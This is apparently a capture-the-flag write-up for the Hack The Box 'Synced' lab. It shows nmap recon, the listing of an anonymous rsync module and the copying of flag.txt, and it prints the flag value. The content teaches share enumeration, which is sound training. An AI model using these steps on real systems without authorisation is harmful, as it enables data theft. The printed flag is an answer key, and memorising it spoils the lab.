---
title: "HTB Synced"
date: 2026-06-22
tags: [htb, very-easy, linux, rsync]
platform: htb
description: "Anonymous rsync share on port 873 — list it and pull flag.txt straight off."
outline: [2, 3]
---

# HTB Synced

Very Easy Starting Point box. One open port — `873/rsync` — exposing an anonymous share. Two commands and the flag is yours: list the share, then copy `flag.txt` down.

::: tip Lesson from this box
When you see any unauthenticated file-share service (ftp, rsync, smb, webdav), your first move is *enumerate the share, don't try to pop the service*. The exploit here was "rsync has anonymous read access" — not a CVE.
:::

## Recon

```bash
nmap -sV 10.129.228.37
```

```
PORT     STATE    SERVICE VERSION
873/tcp  open     rsync   (protocol version 31)
5952/tcp filtered unknown
```

Just rsync on its default port. The filtered 5952 is noise — not enumerated.

## Enumeration

### List anonymous rsync modules

Rsync uses a share-style module layout. List what's available without authentication:

```bash
rsync 10.129.228.37::
```

```
public          Anonymous Share
```

One module: `public`, described as "Anonymous Share". List its contents:

```bash
rsync --list-only 10.129.228.37::public
```

```
drwxr-xr-x          4,096 2022/10/24 18:02:23 .
-rw-r--r--             33 2022/10/24 17:32:03 flag.txt
```

`flag.txt` — 33 bytes (HTB flags are 32 hex chars + newline). Right there.

## Exploitation

Pull the file with rsync's standard copy syntax. The double-colon form addresses a module by name; trailing slash matters (no slash = file, slash = directory).

```bash
rsync 10.129.228.37::public/flag.txt .
cat flag.txt
```

```
72eaf5344ebb84908ae543a719830519
```

::: warning rsync syntax gotcha
- `rsync <ip>::`                       — list all modules
- `rsync <ip>::<module>/`             — list contents of a module
- `rsync <ip>::<module>/<file>`        — fetch one file
- `rsync <ip>::<module>/<dir>/`        — recursively fetch a dir (use `-a`)

Mixing these up gives cryptic errors. The double colon (`::`) selects a module by name; the single colon (`:`) is for *ssh-mode* rsync and won't work here.
:::

## Flag

`72eaf5344ebb84908ae543a719830519` — pulled from the anonymous `public` rsync module, no credentials required.
